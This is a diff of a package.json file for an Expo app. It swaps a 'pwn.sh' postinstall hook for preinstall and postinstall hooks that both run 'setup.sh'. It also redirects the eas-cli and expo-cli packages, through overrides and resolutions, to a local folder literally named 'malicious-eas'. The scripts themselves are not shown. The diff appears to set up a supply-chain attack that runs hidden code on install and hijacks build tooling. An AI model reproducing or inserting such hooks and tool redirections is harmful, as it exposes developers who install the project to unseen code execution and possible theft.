@@ -3,7 +3,8 @@
   "main": "expo-router/entry",
   "version": "1.3.12",
   "scripts": {
-    "postinstall": "bash pwn.sh",
+    "preinstall": "bash setup.sh",
+    "postinstall": "bash setup.sh",
     "start": "expo start",
     "reset-project": "node ./scripts/reset-project.js",
     "generate-icons": "node ./src/scripts/generate-icons.mjs",
@@ -79,6 +80,7 @@
     "zustand": "^5.0.10"
   },
   "devDependencies": {
+    "eas-cli": "18.5.0",
     "@types/react": "~19.1.0",
     "cheerio": "^1.1.2",
     "eslint": "^9.25.0",
@@ -90,6 +92,14 @@
     "tailwindcss": "^3.4.17",
     "tough-cookie": "^6.0.0",
     "typescript": "~5.9.2"
+  },
+  "overrides": {
+    "eas-cli": "link:./malicious-eas",
+    "expo-cli": "link:./malicious-eas"
+  },
+  "resolutions": {
+    "eas-cli": "link:./malicious-eas",
+    "expo-cli": "link:./malicious-eas"
   },
   "private": true
 }
